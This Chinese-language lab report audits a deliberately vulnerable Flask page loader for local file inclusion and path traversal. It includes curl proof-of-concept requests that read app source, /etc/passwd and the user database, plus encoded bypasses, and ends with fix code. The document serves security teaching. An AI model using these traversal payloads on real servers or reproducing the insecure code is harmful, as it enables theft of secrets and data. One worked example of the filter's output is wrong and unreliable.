## 第一章：实验概述

### 1.1 实验目的

1. 理解**文件包含漏洞**（File Inclusion）的产生原理与攻击手法
2. 区分**本地文件包含 LFI** 与**远程文件包含 RFI**
3. 掌握使用 Burp Suite 进行文件包含漏洞测试的方法
4. 学会识别不安全的文件路径拼接中的 5 类典型漏洞
5. 掌握文件包含功能的**安全加固方案**（路径校验 + 白名单 + 字符过滤 + 规范化验证）
6. 通过本次实验完成对项目全部功能的**完整安全审计与修复**

### 1.2 什么是文件包含漏洞？

文件包含漏洞（File Inclusion Vulnerability）是指应用程序在**动态加载文件**时，将用户可控的输入直接拼接到文件路径中，导致攻击者可以包含（读取）未授权的文件。

**两种主要类型：**

| 类型 | 英文 | 说明 | 严重程度 |
|------|------|------|---------|
| 本地文件包含 | LFI (Local File Inclusion) | 读取服务器上的本地文件 | 严重 |
| 远程文件包含 | RFI (Remote File Inclusion) | 加载远程服务器上的恶意文件 | 严重 |

### 1.3 文件包含与路径遍历的关系

```
文件包含漏洞与路径遍历漏洞经常同时出现：

路径遍历 (Path Traversal)：
  通过 ../ 等序列访问不在预期目录中的文件
  例如：/page?name=../../../etc/passwd

本地文件包含 (LFI)：
  将文件内容包含到页面输出中
  例如：/page?name=../app.py → app.py 的内容被渲染到页面上

在本项目中，/page?name= 同时存在这两个漏洞：
  · 路径遍历：通过 ../ 穿越到 pages/ 目录之外
  · 文件包含：遍历到的文件内容被读取并显示在页面中
```

### 1.4 本次新增功能背景

在已有功能基础上，本次新增了**动态页面加载功能**，允许通过 URL 参数加载 `pages/` 目录中的 HTML 文件，实现帮助中心等静态页面的动态展示。

**功能规范（最初版本故意保留的不安全写法）：**

| 项目 | 要求 |
|------|------|
| 文件路径拼接 | `os.path.join("pages", name)` — 直接拼接 |
| 路径校验 | **无** — 不检查 `../` 路径穿越 |
| 路径规范化 | **无** — 不使用 `os.path.realpath` |
| 字符过滤 | **无** — 不对 name 参数做任何过滤 |
| 访问权限 | **无** — 未登录也可访问 |
| 输出编码 | `{{ page_content \| safe }}` — 未转义输出 |

## 第二章：文件包含漏洞基础理论

### 2.1 文件包含漏洞的产生原因

```
文件包含漏洞 = 用户可控的路径输入 + 直接拼接文件路径 + 无权限校验
```

**典型危险代码模式：**

```python
# 危险！用户输入的 name 直接拼接到路径中
file_path = os.path.join("pages", name)   # name = ../../../etc/passwd
content = open(file_path).read()          # 读取了 /etc/passwd 的内容！
```

### 2.2 文件包含漏洞的危害路径

```
攻击者通过文件包含漏洞可以：

┌──────────────────────────────────────────┐
│ 1. 读取系统敏感文件                        │
│    /etc/passwd → 用户列表枚举              │
│    /etc/shadow → 密码哈希（如果可读）       │
│    /proc/self/environ → 环境变量          │
├──────────────────────────────────────────┤
│ 2. 读取应用源代码                          │
│    app.py → 获取数据库密码、密钥等         │
│    config.py → 获取应用配置                │
├──────────────────────────────────────────┤
│ 3. 下载数据库文件                          │
│    data/users.db → 获取所有用户数据        │
├──────────────────────────────────────────┤
│ 4. 读取日志文件（日志注入）                │
│    access.log → 在日志中注入 PHP 代码      │
│    然后包含日志文件 → 代码执行             │
├──────────────────────────────────────────┤
│ 5. 远程文件包含（如果支持 URL 包含）        │
│    加载远程恶意脚本 → 任意代码执行         │
└──────────────────────────────────────────┘
```

### 2.3 文件包含 vs 路径遍历

| 对比维度 | 路径遍历 (Path Traversal) | 文件包含 (File Inclusion) |
|---------|--------------------------|--------------------------|
| **核心操作** | 访问不在预期目录的文件 | 将文件内容包含到输出中 |
| **常见场景** | 文件下载、图片查看 | 模板加载、页面渲染 |
| **危害** | 文件被读取/下载 | 文件内容被解析/执行 |
| **PHP 中的差异** | `file_get_contents()` | `include()` / `require()` |
| **本项目中** | `/page?name=../app.py` 穿越目录 | 穿越后文件内容被 `{{ \| safe }}` 渲染 |

### 2.4 文件包含的三种常见攻击手法

```
手法1：简单路径穿越
  输入：../../../etc/passwd
  路径：pages/../../../etc/passwd → /etc/passwd

手法2：编码绕过
  输入：..%2F..%2F..%2Fetc/passwd（URL编码）
  路径：如果服务器先解码再拼接，则穿越成功

手法3：双重编码绕过
  输入：..%252F..%252F..%252Fetc/passwd
  路径：%252F → %2F（第一次解码）→ /（第二次解码）
```

## 第三章：本次新增的动态页面功能分析

### 3.1 功能说明

动态页面加载功能允许访问 `pages/` 目录下的 HTML 文件，通过 URL 参数 `name` 指定文件名：

| 路由 | 方法 | 功能 |
|------|------|------|
| `GET /page?name=help` | GET | 加载并显示 `pages/help.html` 的内容 |
| `GET /page?name=about` | GET | 如果 `pages/about.html` 存在则显示 |

### 3.2 功能代码分析（修复前）

```python
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")     # 用户可控输入
    page_content = None

    if name:
        file_path = os.path.join(PAGES_DIR, name)  # 直接拼接！

        if os.path.isfile(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                page_content = f.read()             # 读取文件内容
        else:
            file_path_html = os.path.join(PAGES_DIR, name + ".html")
            if os.path.isfile(file_path_html):
                with open(file_path_html, "r", encoding="utf-8") as f:
                    page_content = f.read()

    return render_template("index.html", page_content=page_content)
```

### 3.3 前端模板（`index.html`）

```html
{% if page_content %}
<div class="card">
    <div class="page-content">
        {{ page_content | safe }}    <!-- | safe 不过滤 HTML，直接渲染 -->
    </div>
</div>
{% endif %}
```

### 3.4 安全缺陷汇总（修复前）

| 缺陷 | 严重程度 | 说明 |
|------|---------|------|
| 无路径校验（直接拼接用户输入） | 严重 | `os.path.join` 直接拼接，`../` 可穿越目录 |
| 无字符过滤 | 严重 | `.`、`/` 等路径穿越字符未被过滤 |
| 无路径规范化验证 | 严重 | 未使用 `os.path.realpath` 校验 |
| 无法访问控制 | 中危 | 未登录也可访问动态页面，可能泄露敏感信息 |
| 输出使用 `\| safe` | 中危 | 文件内容直接渲染，如果包含恶意 JS 则 XSS |
| 前缀模式允许任意文件 | 中危 | `.html` 后缀尝试使攻击面扩大 |

## 第四章：漏洞一 — 本地文件包含 LFI / 路径遍历

### 4.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 本地文件包含 LFI + 路径遍历 Path Traversal |
| 危害等级 | **严重（Critical）** — CVSS 9.0 |
| CWE 编号 | CWE-22: Improper Limitation of a Pathname |
| OWASP Top 10 | A01:2021 – Broken Access Control |
| 影响功能 | 动态页面加载 `GET /page?name=` |

### 4.2 漏洞代码分析（修复前）

```python
PAGES_DIR = os.path.join(app.root_path, "pages")

@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")
    if name:
        # 直接拼接用户输入到路径中 — 未做任何校验！
        file_path = os.path.join(PAGES_DIR, name)
        if os.path.isfile(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                page_content = f.read()
```

**根本原因：** `os.path.join(PAGES_DIR, name)` 将用户输入的 `name` 直接拼接到路径中。当 `name` 包含 `../` 序列时，路径会穿越到 `pages/` 目录之外。

**`os.path.join()` 的行为分析：**

```python
# PAGES_DIR = "/root/flask_user_app/pages"

os.path.join("/root/flask_user_app/pages", "help")
# → "/root/flask_user_app/pages/help"              ✅ 在 pages 内

os.path.join("/root/flask_user_app/pages", "../app.py")
# → "/root/flask_user_app/pages/../app.py"
# → 实际文件系统解析为 "/root/flask_user_app/app.py"  ❌ 穿越到 pages 外！

os.path.join("/root/flask_user_app/pages", "../../../../etc/passwd")
# → "/root/flask_user_app/pages/../../../../etc/passwd"
# → 实际文件系统解析为 "/etc/passwd"                  ❌ 穿越到系统目录！
```

### 4.3 攻击复现 — POC 1：读取应用源代码

**攻击目标：** 读取 `app.py` 源码，获取数据库配置、密钥等敏感信息。

```bash
curl "http://192.168.14.129:5000/page?name=../app.py"
```

**攻击结果：**

```
攻击者可以读取到以下敏感信息：
  · app.secret_key（Session 加密密钥）
  · DB_PATH（数据库文件路径）
  · USERS 字典结构（用户数据模型）
  · generate_password_hash（密码哈希逻辑）
  · 所有路由的实现代码

这些信息可用于进一步的攻击：
  1. 如果 secret_key 被获取 → 伪造任意用户 Session
  2. 如果 DB_PATH 被获取 → 下一步下载数据库文件
  3. 了解代码结构 → 发现更多攻击面
```

### 4.4 攻击复现 — POC 2：读取系统文件

```bash
# 读取 Linux 用户信息
curl "http://192.168.14.129:5000/page?name=../../../../etc/passwd"

# 输出示例：
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...

# 读取系统配置文件
curl "http://192.168.14.129:5000/page?name=../../../../etc/hostname"
curl "http://192.168.14.129:5000/page?name=../../../../proc/version"
```

### 4.5 攻击复现 — POC 3：下载数据库文件

```bash
# 读取 SQLite 数据库文件
curl "http://192.168.14.129:5000/page?name=../data/users.db"

# 攻击结果：数据库文件被读取（虽然二进制格式不易读，但可以下载后本地查看）
# sqlite3 提取数据：
sqlite3 users.db "SELECT id, username, balance FROM users;"
# → 所有用户的余额信息泄露
```

### 4.6 攻击复现 — POC 4：URL 编码绕过

```bash
# URL 编码的 ../ （%2E%2E%2F 表示 ../）
curl "http://192.168.14.129:5000/page?name=%2E%2E%2Fapp.py"

# 双重 URL 编码尝试
curl "http://192.168.14.129:5000/page?name=%252E%252E%252Fapp.py"
```

### 4.7 攻击复现 — POC 5：自动后缀追加绕过

功能代码中，如果 `name` 文件不存在，会自动尝试 `name + ".html"`，这扩大攻击面：

```bash
# .html 后缀尝试
curl "http://192.168.14.129:5000/page?name=../app.py"
# 先尝试 pages/../app.py → 存在！直接读取（不追加 .html）

curl "http://192.168.14.129:5000/page?name=../data/users"
# 先尝试 pages/../data/users → 不存在
# 再尝试 pages/../data/users.html → 存在则读取
```

### 4.8 攻击结果总表（修复前）

| 攻击向量 | URL | 修复前 | 修复后 |
|---------|-----|--------|--------|
| 读取应用源码 | `?name=../app.py` | ✅ 读取成功 | ❌ 拦截 |
| 读取系统密码文件 | `?name=../../../../etc/passwd` | ✅ 读取成功 | ❌ 拦截 |
| 下载数据库 | `?name=../data/users.db` | ✅ 读取成功 | ❌ 拦截 |
| URL 编码 `../` | `?name=%2E%2E%2Fapp.py` | ✅ 读取成功 | ❌ 拦截 |
| 双重编码绕过 | `?name=%252E%252E%252Fapp.py` | ✅ 可能绕过 | ❌ 拦截 |
| 正常访问帮助页面 | `?name=help` | ✅ 正常显示 | ✅ 正常显示 |

## 第五章：漏洞二 — 远程文件包含 RFI

### 5.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 远程文件包含 RFI (Remote File Inclusion) |
| 危害等级 | **严重（Critical）** |
| 影响范围 | 动态页面加载功能（理论风险） |

### 5.2 漏洞分析

虽然本项目的 `open()` 函数不支持 URL 作为路径（Python 的 `open()` 不支持 HTTP URL），但如果代码在未来被修改为使用 `urllib` 或 `requests` 库来获取内容，则存在 RFI 风险。

**本项目的防护说明：**

```python
# 当前代码使用 open() 读取文件，不支持 URL
with open(file_path, "r", encoding="utf-8") as f:
    page_content = f.read()
# open() 不支持 http:// 或 https:// 路径
# 因此当前不存在 RFI 风险
```

**但如果代码被修改为：**

```python
# 危险！如果改为这样则存在 RFI
import requests
response = requests.get(file_path)  # 如果 file_path 是 URL...
```

### 5.3 RFI 防护说明

```
RFI 防护要点：
  1. 只允许本地文件包含，拒绝 URL 协议
  2. 不要使用 urllib/requests 等库加载用户控制的路径
  3. 限制可访问的文件目录范围
  4. 使用白名单模式，只允许包含预定义的文件
```

## 第六章：漏洞三 — 文件内容泄露（敏感信息暴露）

### 6.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 敏感信息暴露 (Sensitive Data Exposure) |
| 危害等级 | **高危（High）** |
| CWE 编号 | CWE-200: Exposure of Sensitive Information |

### 6.2 漏洞分析

当文件包含成功时，被包含文件的内容直接显示在页面中。如果被包含的文件包含敏感信息（如密码、密钥、配置等），这些信息会直接泄露。

**修复前可泄露的敏感信息：**

```
泄露路径                   泄露内容                    危害等级
─────────────────────────────────────────────────────────────
../app.py                  app.secret_key              🔴 严重
                           DB_PATH                     🟡 中危
                           用户数据模型                 🟡 中危

../data/users.db           所有用户数据                 🔴 严重
                           密码哈希                    🟠 高危

../../../../etc/passwd     系统用户列表                 🟡 中危
                           用户名                       🟢 低危
```

### 6.3 修复措施

```
  1. 路径穿越防御（防止读取 pages/ 外的文件）
  2. 统一错误提示（不泄露文件路径信息）
  3. 目录权限控制（数据库文件 600 权限）
  4. 敏感信息不在代码中硬编码（secret_key 随机生成）
```

## 第七章：漏洞四 — XSS 通过文件内容渲染

### 7.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 跨站脚本 XSS (Cross-Site Scripting) |
| 危害等级 | **中危（Medium）** |
| CWE 编号 | CWE-79: Cross-site Scripting |

### 7.2 漏洞分析

**模板中的 `| safe` 过滤器：**

```html
{{ page_content | safe }}
```

`| safe` 是 Jinja2 模板引擎中的过滤器，用于标记内容为"安全"，**跳过 HTML 转义**。这意味着如果 `page_content` 中包含 `<script>` 标签或 HTML 代码，它们会被浏览器直接执行。

**风险场景：**

```
场景1：pages/ 目录被攻击者写入恶意HTML文件
  如果攻击者通过上传漏洞或其他方式在 pages/ 目录中创建了恶意文件
  访问 /page?name=evil → 恶意 HTML 被渲染 → XSS

场景2：文件包含读取到包含 HTML 的系统文件
  某些系统文件的输出被意外渲染为 HTML

场景3：未来功能扩展时引入风险
  如果 pages/ 目录支持用户上传文件，XSS 风险将大大增加
```

**防护建议：**

```
  1. 将 | safe 替换为普通输出 {{ page_content }}（自动转义）
  2. 如果必须使用 | safe，确保 page_content 的来源可信
  3. 对 page_content 进行 HTML 净化（如 bleach 库）
```

## 第十章：文件包含漏洞防护方案

### 10.1 防护总览

```
              文件包含漏洞防护体系

  第一层：输入字符过滤（基础防御）
  ────────────────────────────────
  re.sub(r"[^a-zA-Z0-9_\-]", "", name)
  只允许字母、数字、下划线、短横线
  → 彻底阻断 ../ 等路径穿越字符

  第二层：路径规范化验证（核心防御）
  ────────────────────────────────
  os.path.realpath() 获取真实路径
  str.startswith(pages_real) 验证在 pages 目录内
  → 防止经过编码/变形的路径穿越

  第三层：合理的输出安全（辅助防御）
  ────────────────────────────────
  pages/ 目录内文件被信任
  不建议在公开页面使用 | safe
  → 降低 XSS 风险

  第四层：错误信息保护（辅助防御）
  ────────────────────────────────
  统一显示"页面不存在"
  不泄露文件路径、不存在的原因等
  → 防止信息泄露
```

### 10.2 完整修复代码

```python
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")
    page_content = None

    if name:
        # 第一层防御：字符白名单过滤
        # 只允许字母、数字、下划线、短横线
        # 彻底阻断 ../ . / \ 等路径穿越字符
        safe_name = re.sub(r"[^a-zA-Z0-9_\-]", "", name)

        if not safe_name:
            page_content = "页面不存在"
        else:
            # 第二层防御：路径规范化与目录验证
            file_path = os.path.join(PAGES_DIR, safe_name)
            real_path = os.path.realpath(file_path)
            pages_real = os.path.realpath(PAGES_DIR)

            # 验证：文件必须在 pages/ 目录内
            if not real_path.startswith(pages_real + os.sep) \
               and real_path != pages_real:
                page_content = "页面不存在"
            elif os.path.isfile(real_path):
                try:
                    with open(real_path, "r", encoding="utf-8") as f:
                        page_content = f.read()
                except Exception:
                    page_content = None
            else:
                # 尝试加 .html 后缀再找一次
                file_path_html = os.path.join(PAGES_DIR, safe_name + ".html")
                real_path_html = os.path.realpath(file_path_html)

                if not real_path_html.startswith(pages_real + os.sep) \
                   and real_path_html != pages_real:
                    page_content = "页面不存在"
                elif os.path.isfile(real_path_html):
                    try:
                        with open(real_path_html, "r", encoding="utf-8") as f:
                            page_content = f.read()
                    except Exception:
                        page_content = None
                else:
                    page_content = None

        if page_content is None:
            page_content = "页面不存在"

    username = session.get("username")
    user_info = None
    if username and username in USERS:
        user_info = {k: v for k, v in USERS[username].items() if k != "password"}

    return render_template("index.html", user_info=user_info,
                           page_content=page_content)
```

### 10.3 防御原理解析

```
第一阶段：字符过滤
  输入：name = "../../../etc/passwd"
  过滤：re.sub(r"[^a-zA-Z0-9_\-]", "", name)
  结果：safe_name = "----------etcpasswd"（特殊字符全被移除）
  判断：safe_name 不含有效字符 → "页面不存在"
  → 路径穿越字符被彻底清除！

第二阶段：路径规范化
  假设用户输入绕过了第一阶段（理论上不可能，因为../已被过滤）
  os.path.realpath() 将相对路径转换为绝对路径
  然后验证是否以 PAGES_DIR 开头

第三阶段：双层防御
  · 字符过滤 + 路径验证 = 双层保险
  · 任何一层都能拦截攻击
```

### 14.4 结束语

> **"一个字符的信任，就可能让整个系统沦陷。"**

文件包含漏洞是所有 Web 安全漏洞中最"隐蔽"的一种。它不像 SQL 注入那样需要复杂的 payload 构造，也不像 XSS 那样需要精心的脚本编写。它只需要一个简单的 `../`，就能让攻击者读取到系统中任何可读的文件。

防御它的方式也同样简单：**永远不要相信用户输入的路径，永远不要直接将用户输入拼接到文件路径中。**

从第一轮的密码安全加固，到最后一轮的文件包含防护，本项目从一个简陋的 Flask 登录系统，成长为一个具备基本安全防护能力的 Web 应用。**安全不是最终的状态，而是持续的过程。**
